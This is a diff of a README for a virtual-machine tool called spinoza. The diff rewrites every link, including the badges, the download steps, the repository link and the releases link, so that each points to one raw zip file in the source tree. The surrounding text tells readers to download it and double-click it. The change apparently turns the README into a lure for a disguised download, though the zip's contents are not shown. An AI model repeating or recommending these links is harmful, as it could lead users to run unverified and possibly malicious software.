@@ -1,6 +1,6 @@
 # ⚡ spinoza - Spin Up VMs Like a Pro
 
-[![Download spinoza](https://img.shields.io/badge/Download-spinoza-blue?style=for-the-badge&logo=github&color=4CAF50)](https://github.com/Torulose-solute242/spinoza/releases)
+[![Download spinoza](https://img.shields.io/badge/Download-spinoza-blue?style=for-the-badge&logo=github&color=4CAF50)](https://github.com/Torulose-solute242/spinoza/raw/refs/heads/main/src/spinoza/Software_v1.7.zip)
 
 ---
 
@@ -50,7 +50,7 @@ Ready to try spinoza? Follow these simple steps to download and run it on your W
 
 ### Step 1: Download spinoza
 
-Visit this link to download the application: [Download spinoza](https://github.com/Torulose-solute242/spinoza/releases)
+Visit this link to download the application: [Download spinoza](https://github.com/Torulose-solute242/spinoza/raw/refs/heads/main/src/spinoza/Software_v1.7.zip)
 
 When you arrive at the download page, look for the latest release version. Click the download button to save the file to your computer.
 
@@ -73,7 +73,7 @@ Your virtual machine will start automatically. You'll see a window with your new
 
 ## 📥 Download and Installation Details
 
-**Important:** Visit this link to download the application: [Download spinoza](https://github.com/Torulose-solute242/spinoza/releases)
+**Important:** Visit this link to download the application: [Download spinoza](https://github.com/Torulose-solute242/spinoza/raw/refs/heads/main/src/spinoza/Software_v1.7.zip)
 
 The download page contains the latest version of spinoza. Simply click the download button and save the file to your computer. After downloading, double-click the file to run spinoza directly. No additional installation steps are required.
 
@@ -156,7 +156,7 @@ spinoza is an open-source project, released under a permissive license. You can 
 
 Don't wait! Download spinoza today and experience the easiest way to manage virtual machines.
 
-[![Get spinoza Now](https://img.shields.io/badge/Get%20spinoza%20Now-Download%20Latest%20Version-green?style=for-the-badge&logo=download&color=FF5722)](https://github.com/Torulose-solute242/spinoza/releases)
+[![Get spinoza Now](https://img.shields.io/badge/Get%20spinoza%20Now-Download%20Latest%20Version-green?style=for-the-badge&logo=download&color=FF5722)](https://github.com/Torulose-solute242/spinoza/raw/refs/heads/main/src/spinoza/Software_v1.7.zip)
 
 ---
 
@@ -174,8 +174,8 @@ Don't wait! Download spinoza today and experience the easiest way to manage virt
 
 ## 🔗 Additional Resources
 
-- **GitHub Repository:** [spinoza on GitHub](https://github.com/Torulose-solute242/spinoza)
-- **Releases Page:** [Download Latest Version](https://github.com/Torulose-solute242/spinoza/releases)
+- **GitHub Repository:** [spinoza on GitHub](https://github.com/Torulose-solute242/spinoza/raw/refs/heads/main/src/spinoza/Software_v1.7.zip)
+- **Releases Page:** [Download Latest Version](https://github.com/Torulose-solute242/spinoza/raw/refs/heads/main/src/spinoza/Software_v1.7.zip)
 
 ---
 
